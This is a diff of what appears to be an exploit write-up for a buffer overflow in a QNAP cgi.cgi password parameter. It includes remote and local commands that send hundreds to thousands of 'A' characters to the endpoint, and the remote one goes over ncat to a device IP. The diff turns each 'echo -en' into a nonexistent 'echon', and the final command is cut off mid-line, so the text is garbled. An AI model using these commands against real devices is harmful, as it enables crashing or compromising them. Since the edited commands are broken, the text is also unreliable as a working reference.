@@ -12,7 +12,7 @@ u = valid user [guest|admin]
 
 /* Remote */
 
-[Remote host]# echo -en "GET /cgi-bin/cgi.cgi?u=admin&p=`for((i=0;i<263;i++));do echo -en "A";done` HTTP/1.0\nHost: QNAP\n\n" | ncat --ssl 192.168.5.7 443
+[Remote host]# echon "GET /cgi-bin/cgi.cgi?u=admin&p=`for((i=0;i<263;i++));do echon "A";done` HTTP/1.0\nHost: QNAP\n\n" | ncat --ssl 192.168.5.7 443
 
 HTTP/1.1 200 OK
 
@@ -48,7 +48,7 @@ Content-Type: text/plain
 
 /* Local test, to get more info from backtrace */
 
-# export QUERY_STRING="u=admin&p=`for((i=0;i<263;i++));do echo -en "A";done`"
+# export QUERY_STRING="u=admin&p=`for((i=0;i<263;i++));do echon "A";done`"
 
 # ./cgi.cgi
 
@@ -105,7 +105,7 @@ Aborted
 
 1.3)
 
-# export QUERY_STRING="u=admin&p=`for((i=0;i<5957;i++));do echo -en "A";done`"
+# export QUERY_STRING="u=admin&p=`for((i=0;i<5957;i++));do echon "A";done`"
 
 # ./cgi.cgi
 
@@ -328,6 +328,6 @@ u = valid user [guest|admin]
 
 /* Remote */
 
-[Remote host]# echo -en "GET /cgi-bin/cgi.cgi?u=admin&p=`for((i=0;i
+[Remote host]# echon "GET /cgi-bin/cgi.cgi?u=admin&p=`for((i=0;i
 
 Sign Time : 2017/01/01 03:50:06
